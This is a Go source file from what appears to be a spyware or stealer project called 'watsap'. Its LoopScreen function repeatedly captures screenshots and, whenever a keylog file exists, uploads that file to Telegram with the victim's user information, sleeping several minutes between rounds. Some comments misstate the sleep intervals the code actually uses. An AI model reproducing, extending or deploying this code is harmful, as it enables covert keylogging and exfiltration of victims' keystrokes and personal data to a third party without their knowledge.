package screen

import (
	"math/rand"
	"time"
	"watsap/utils/config"
	"watsap/utils/files"
	"watsap/utils/logger"
	"watsap/utils/messages"
	"watsap/utils/telegram"
)

// to-do: try better approach
func LoopScreen() {
	logger.Debug("Screen", "Starting screenshot plugin")
	for {
		InitScreen()
		if files.Exists(config.KeylogFile) {
			telegram.TgSendFile(config.KeylogFile, messages.GetUserInfoMsg())
		}
		if config.DebugMode {
			// Random sleep between 1-3 minutes
			sleepDuration := time.Duration(rand.Intn(2)+1) * time.Minute
			time.Sleep(sleepDuration)
		} else {
			// sleep random between 5-10 minutes
			sleepDuration := time.Duration(10) * time.Minute
			time.Sleep(sleepDuration)
			//time.Sleep(1 * time.Second)
		}
	}

}
